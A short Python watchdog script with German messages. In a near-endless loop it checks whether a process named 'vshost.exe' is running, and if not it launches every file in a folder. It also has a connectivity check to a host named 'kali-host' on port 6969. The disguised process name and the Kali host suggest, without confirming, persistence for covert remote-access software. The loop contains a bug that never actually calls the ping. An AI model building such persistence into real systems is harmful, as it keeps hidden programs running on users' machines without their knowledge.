import pathlib as pl
import subprocess
import ctypes
import socket
import time
 
BASE_DIR = str(pl.Path.home() / "python" / "src")
VSHOST_DIR = str(pl.Path.home() / "python" / "src" / "vshost")
 
def tcp_ping(host="kali-host.akirottv.de", port=6969, timeout=1):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.close()
        print("Ping - Successfully")
        return True
    except Exception as e:
        print(e)
        return False
 
def vshost_running() -> bool:
    output = subprocess.check_output("tasklist", shell=True).decode()
    print(output)
    print(output.rfind("vshost.exe") != -1)
    return output.rfind("vshost.exe") != -1
 
def start_vshost():
    print("→ Starte Dateien...")
 
    for file in pl.Path(VSHOST_DIR).iterdir():
        if file.is_file():
            try:
                print(f"→ Öffne {file.name}")
 
                subprocess.Popen(
                    f'start "" "{file}"',
                    shell=True,
                    cwd=BASE_DIR
                )
 
            except Exception as e:
                print(f"Startfehler: {e}")
 
if __name__ == "__main__":
    for i in range(10000000):
        time.sleep(15)
        if tcp_ping and not vshost_running():
            start_vshost()
